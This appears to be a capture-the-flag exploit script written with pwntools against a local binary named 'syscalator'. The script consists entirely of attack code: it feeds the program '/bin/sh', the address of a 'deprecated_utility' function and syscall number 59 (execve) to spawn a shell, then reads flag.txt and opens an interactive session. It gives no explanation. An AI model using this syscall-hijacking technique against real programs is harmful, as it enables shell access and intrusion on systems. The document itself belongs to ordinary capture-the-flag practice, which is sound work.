from pwn import*

elf = context.binary = ELF('./syscalator')
p = process()


p.sendline(b'/bin/sh')
p.sendline(hex(elf.sym['deprecated_utility']))
p.sendline(b'0')
p.sendline(b'0')
p.sendline(b'59')
p.sendline('cat flag.txt')

p.interactive()
